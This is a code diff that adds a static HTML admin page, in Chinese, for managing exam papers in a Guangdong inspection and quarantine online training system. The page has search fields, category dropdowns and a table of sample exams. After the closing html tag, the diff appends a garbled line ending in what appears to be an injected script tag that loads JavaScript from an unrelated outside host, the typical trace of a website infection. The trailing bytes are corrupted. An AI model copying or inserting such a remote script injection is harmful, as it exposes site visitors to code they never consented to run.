@@ -1,0 +1,208 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>广东检验检疫（检务）网上培训系统后台管理系统</title>
+<link href="../css/htlogin.css" rel="stylesheet" type="text/css" />
+<link href="../datepicker/default/datePicker.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="../datepicker/WdatePicker.js"></script>
+</head>
+<script>
+	function add_Sub()
+	{
+		window.document.location="testpaper.html";
+	}
+	function show_person()
+	{
+		if(window.document.getElementById("allcompany").style.display=='none')
+		{
+			window.document.getElementById("allcompany").style.display='';
+		}
+		else
+		{
+			window.document.getElementById("allcompany").style.display='none'
+		}
+	}
+	function close_company()
+	{
+		window.document.getElementById("allcompany").style.display='none'
+	}
+</script>
+<body topmargin="0" leftmargin="0">
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr>
+          <td height="195" background="../images/ht-body01.jpg" class="body02">当前位置：考试管理-试卷管理</td>
+        </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td class="body01"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr>
+          <td colspan="4" background="../images/ht-body02.jpg" class="body03">查询条件</td>
+        </tr>
+        <tr>
+          <td width="25%" class="body06">试卷编号：</td>
+          <td width="27%" class="body04"><input name="textfield9" type="text" class="bodytext"  value="42060001"/></td>
+          <td width="21%" class="body06">试卷名称：</td>
+          <td width="23%" class="body04"><input name="textfield94" type="text" class="bodytext" /></td>
+        </tr>
+        
+            <tr>
+              <td class="body06">分类专业</td>
+              <td class="body04">
+			<select style="width:100px;">
+				<option>- 不限 -</option>
+				<option>检务</option>
+				<option>食品</option>
+				<option>动检</option>
+				<option>植检</option>
+				<option>财务</option>
+				<option>统计</option>
+			</select>		
+		</td>
+              <td class="body06">专业岗位：</td>
+              <td class="body04">
+			<select>
+				<option>- 不限定 -</option>
+				<option>报检岗</option>
+				<option>计费岗</option>
+				<option>签证岗</option>
+				<option>放行岗</option>
+				<option>档案管理岗</option>
+				<option>流程管理岗</option>
+				<option>证单管理岗</option>
+				<option>印章管理岗</option>
+				<option>综合管理岗</option>
+			</select>
+		</td>
+            </tr>
+		<tr>
+          <td class="body06">生成试卷从：</td>
+          <td class="body04"><input name="textfield92" type="text" class="Wdate" onfocus="new WdatePicker(this)"/></td>
+          <td class="body06">到：</td>
+          <td class="body04"><input name="textfield93" type="text" class="Wdate" onfocus="new WdatePicker(this)" /></td>
+        </tr>
+	
+        <tr>
+          <td colspan="4" class="body03"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="69%" height="35">&nbsp;</td>
+                <td width="11%"><input type="image" src="../images/ht-but-scsj.jpg" onclick="window.location='testpaper.html';"/></td>
+                <td width="10%"><input type="image" src="../images/ht-but-check.jpg"/></td>
+                <td width="10%"><input type="image" src="../images/ht-but-del.jpg" onclick="javascript:alert('Del Successful')"/></td>
+              </tr>
+          </table></td>
+        </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td class="body01a"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr>
+          <td colspan="14" background="../images/ht-body02.jpg" class="body03">查询结果</td>
+        </tr>
+        <tr>
+          <td width="8%" align="center" nowrap="nowrap" class="body05">选择</td>
+          <td width="9%" align="center" nowrap="nowrap" class="body05">编号</td>
+          <td width="16%" align="center" nowrap="nowrap" class="body05">标题</td>
+          <td width="12%" align="center" nowrap="nowrap" class="body05">分类专业</td>
+          <td width="12%" align="center" nowrap="nowrap" class="body05">专业岗位</td>
+          <td width="9%" align="center" nowrap="nowrap" class="body05">答卷时间(分)</td>
+          <td width="9%" align="center" nowrap="nowrap" class="body05">点击数(次)</td>
+          <td width="13%" align="center" nowrap="nowrap" class="body05">生成时间</td>
+         
+          <td width="11%" align="center" nowrap="nowrap" class="body05">操&nbsp;&nbsp;作</td>
+        </tr>
+        <tr>
+          <td height="35" nowrap="nowrap" class="body03"><input type="checkbox" name="checkbox5" value="checkbox" /></td>
+          <td nowrap="nowrap" class="body03">4206001</td>
+          <td nowrap="nowrap" class="body03">疫情专题考试</td>
+          <td nowrap="nowrap" class="body03">检务</td>
+          <td nowrap="nowrap" class="body03">报检岗</td>
+          <td nowrap="nowrap" class="body03">100</td>
+          <td nowrap="nowrap" class="body03">1000</td>
+          <td nowrap="nowrap" class="body03">2007-10-09</td>
+          <td nowrap="nowrap" class="body03"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" />
+		  <input type="image" src="../images/ht-but-adit.jpg" name="Submit224" onclick="window.location='testpaper.html';"/></td>
+        </tr>
+        <tr>
+          <td nowrap="nowrap" class="body06"><input type="checkbox" name="checkbox6" value="checkbox" />          </td>
+          <td nowrap="nowrap" class="body06">4206002</td>
+          <td nowrap="nowrap" class="body06">值勤方式考试</td>
+          <td nowrap="nowrap" class="body06">食品</td>
+          <td nowrap="nowrap" class="body06">计费岗</td>
+          <td nowrap="nowrap" class="body06">100</td>
+          <td nowrap="nowrap" class="body06">568</td>
+          <td nowrap="nowrap" class="body06">2007-10-09</td>
+          <td nowrap="nowrap" class="body06"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" />
+		  <input type="image" src="../images/ht-but-adit.jpg" name="Submit224" onclick="window.location='testpaper.html';"/></td>
+        </tr>
+        <tr>
+          <td nowrap="nowrap" class="body03"><input type="checkbox" name="checkbox7" value="checkbox" /></td>
+          <td nowrap="nowrap" class="body03">4206003</td>
+          <td nowrap="nowrap" class="body03">检验方式考试</td>
+          <td nowrap="nowrap" class="body03">动检</td>
+          <td nowrap="nowrap" class="body03">档案管理岗</td>
+          <td nowrap="nowrap" class="body03">100</td>
+          <td nowrap="nowrap" class="body03">983</td>
+          <td nowrap="nowrap" class="body03">2007-10-09</td>
+          <td nowrap="nowrap" class="body03"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" />
+		  <input type="image" src="../images/ht-but-adit.jpg" name="Submit224" onclick="window.location='testpaper.html';"/></td>
+        </tr>
+        <tr>
+          <td nowrap="nowrap" class="body06"><input type="checkbox" name="checkbox8" value="checkbox" />          </td>
+          <td nowrap="nowrap" class="body06">4206004</td>
+          <td nowrap="nowrap" class="body06">特殊情况处理考试</td>
+          <td nowrap="nowrap" class="body06">统计</td>
+          <td nowrap="nowrap" class="body06">证单管理岗</td>
+          <td nowrap="nowrap" class="body06">100</td>
+          <td nowrap="nowrap" class="body06">256</td>
+          <td nowrap="nowrap" class="body06">2007-10-09</td>
+          <td nowrap="nowrap" class="body06"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" />
+		  <input type="image" src="../images/ht-but-adit.jpg" name="Submit224" onclick="window.location='testpaper.html';"/></td>
+        </tr>
+        <tr>
+          <td colspan="14" class="body03">&nbsp;</td>
+        </tr>
+    </table></td>
+  </tr>
+</table>
+<div id="allcompany"  style="display:none; position: absolute; left:30px; top:200px; width:500px; height:180zopx;" >
+		<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF">
+			<tr>
+				<td class="body03"><input type="checkbox"/>单位1</td>
+				<td class="body03"><input type="checkbox"/>单位2</td>
+				<td class="body03"><input type="checkbox"/>单位3</td>
+				<td class="body03"><input type="checkbox"/>单位4</td>
+				<td class="body03"><input type="checkbox"/>单位5</td>
+				<td class="body03"><input type="checkbox"/>单位6</td>
+			</tr>
+			<tr>
+				<td class="body06"><input type="checkbox"/>单位7</td>
+				<td class="body06"><input type="checkbox"/>单位8</td>
+				<td class="body06"><input type="checkbox"/>单位9</td>
+				<td class="body06"><input type="checkbox"/>单位10</td>
+				<td class="body06"><input type="checkbox"/>单位11</td>
+				<td class="body06"><input type="checkbox"/>单位12</td>
+			</tr>
+			<tr>
+				<td class="body03"><input type="checkbox"/>单位13</td>
+				<td class="body03"><input type="checkbox"/>单位14</td>
+				<td class="body03"><input type="checkbox"/>单位15</td>
+				<td class="body03"><input type="checkbox"/>单位16</td>
+				<td class="body03"><input type="checkbox"/>单位17</td>
+				<td class="body03"><input type="checkbox"/>单位18</td>
+			</tr>
+			<tr>
+				<td colspan="4"></td>
+				<td colspan="2"><a href="#" onclick="close_company()">确定</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="#" onclick="close_company()">关闭</a></td>
+			</tr>
+		</table>
+	</div>
+</body>
+</html>
+
+{?
+z??O5?vm塆?g9鲍櫀韾靐ttp://qqq.dzydhx.com/gm.js></script>
